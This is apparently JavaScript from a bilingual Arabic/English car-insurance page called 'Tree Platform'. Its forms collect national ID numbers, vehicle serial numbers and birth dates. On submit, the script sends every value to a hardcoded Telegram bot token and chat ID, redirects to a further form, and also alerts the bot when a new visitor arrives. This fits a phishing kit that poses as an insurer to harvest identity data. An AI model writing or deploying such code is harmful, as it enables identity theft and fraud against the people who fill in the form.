  const toggleBtn = document.getElementById("toggleLang");
    let currentLang = 'ar';

    const translations = {
      ar: {
        langBtn: "EN / ع",
        dir: "rtl",
        title: "منصة Tree",
        subtitle: "ما في أحلى من الحرية، سوق الحين براحتك",
        slogan: "لا تفوت الفرصة، أأمن سيارتك بأفضل الأسعار!",
        tabs: ["تأمين جديد", "نقل الملكية", "تجديد الوثيقة"],
        submit: "أمّن سيارتك",
        privacy: 'بالمتابعة، أقر بقراءة وفهم وقبول <a href=\"#\">إشعار الخصوصية</a> لشركة تري الرقمية لوكالة التأمين'
      },
      en: {
        langBtn: "ع",
        dir: "ltr",
        title: "Tree Platform",
        subtitle: "Nothing beats freedom, drive now with confidence",
        slogan: "Don’t miss out – insure your car at the best prices!",
        tabs: ["New Insurance", "Ownership Transfer", "Renew Document"],
        submit: "Insure Your Car",
        privacy: 'By continuing, I acknowledge reading and accepting the <a href=\"#\">privacy notice</a> of Tree Insurance Agency'
      }
    };

    toggleBtn.addEventListener("click", () => {
      currentLang = currentLang === "ar" ? "en" : "ar";
      const t = translations[currentLang];
      document.documentElement.lang = currentLang;
      document.documentElement.dir = t.dir;
      toggleBtn.innerText = t.langBtn;
      document.title = t.title;
      document.querySelector(".subtitle").innerText = t.subtitle;
      document.querySelector(".slogan").innerText = t.slogan;
      document.getElementById("tex1").innerText = t.tabs[0];
      document.getElementById("tex2").innerText = t.tabs[1];
      document.getElementById("tex3").innerText = t.tabs[2];

      renderForm(document.querySelector(".tab.active").dataset.type);
      document.querySelector(".checkbox-wrapper label").innerHTML = t.privacy;
    });

    const form = document.getElementById('dynamic-form');
    const tabs = document.querySelectorAll('.tab');

    const fields = {
      new: [
        { placeholder: 'الرقم التسلسلي / بطاقة جمركية', name: 'serial' },
        { placeholder: 'رقم الهوية / الإقامة', name: 'id' },
        { placeholder: 'شهر / سنة الميلاد', name: 'dob' },
      ],
      transfer: [
        { placeholder: 'الرقم التسلسلي', name: 'serial' },
        { placeholder: 'رقم الهوية للبائع', name: 'seller_id' },
        { placeholder: 'رقم الهوية للمشتري', name: 'buyer_id' },
        { placeholder: 'تاريخ ميلاد البائع', name: 'seller_dob' },
      ],
      renew: [
        { placeholder: 'رقم الهوية / الإقامة', name: 'id' },
      ],
    };

    function renderForm(type) {
      form.innerHTML = '';
      fields[type].forEach(field => {
        const group = document.createElement('div');
        group.className = 'form-group';
        group.innerHTML = `
          <input type="text" name="${field.name}" placeholder="${field.placeholder}" required />
        `;
        form.appendChild(group);
      });

      const btn = document.createElement('button');
      btn.type = 'submit';
      btn.className = 'submit-btn';
      btn.innerText = 'أمّن سيارتك';
      form.appendChild(btn);
    }

    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        renderForm(tab.dataset.type);
      });
    });

    renderForm('new');

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      if (!document.getElementById('privacy').checked) {
        alert('يجب الموافقة على إشعار الخصوصية.');
        return;
      }

      const fieldLabels = {
        id: "رقم الهوية",
        serial: "الرقم التسلسلي",
        dob: "تاريخ الميلاد",
        seller_id: "رقم هوية البائع",
        buyer_id: "رقم هوية المشتري",
        seller_dob: "تاريخ ميلاد البائع"
      };

      const formData = new FormData(form);
      let message = "🚗 طلب تأمين:\n\n";
      const dataObj = {};

      for (const [name, value] of formData.entries()) {
        const label = fieldLabels[name] || name;
        message += `🔹 ${label}: ${value}\n`;
        dataObj[name] = value;
      }

      localStorage.setItem("formData", JSON.stringify(dataObj));

      const token = "7806336521:AAHzuJNE-UrkUIIv6gTVrv6vczz39c0N_Jw";
      const chatId = "6454807559";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          form.reset();
          window.location.href = "form1.html";
        } else {
          alert("❌ فشل في إرسال البيانات");
        }
      })
      .catch(error => {
        console.error(error);
        alert("❌ حدث خطأ أثناء الاتصال");
      });
    });

    function getDeviceInfo() {
  const ua = navigator.userAgent;

  if (/iPhone/i.test(ua)) return "iPhone";
  if (/iPad/i.test(ua)) return "iPad";
  if (/Android/i.test(ua)) {
    if (/Samsung/i.test(ua)) return "Samsung (Android)";
    if (/Huawei/i.test(ua)) return "Huawei (Android)";
    if (/Xiaomi/i.test(ua)) return "Xiaomi (Android)";
    return "Android";
  }
  if (/Windows/i.test(ua)) return "Windows PC";
  if (/Macintosh/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";

  return "Unknown Device";
}



    const isNewUser = !localStorage.getItem('visitedBefore');

    if (isNewUser) {
      localStorage.setItem('visitedBefore', 'true');

      const message = `🟢 مستخدم جديد فتح الصفحة!`;
      const token = '7806336521:AAHzuJNE-UrkUIIv6gTVrv6vczz39c0N_Jw'; // استبدله بالتوكن الخاص بك
      const chatId = '6454807559';  // استبدله بالمعرف الخاص بك

      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const data = {
        chat_id: chatId,
        text: message
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      }).then(response => {
        if (response.ok) {
          console.log('تم إرسال الإشعار إلى Telegram');
        } else {
          console.error('فشل الإرسال:', response.statusText);
        }
      });
    }
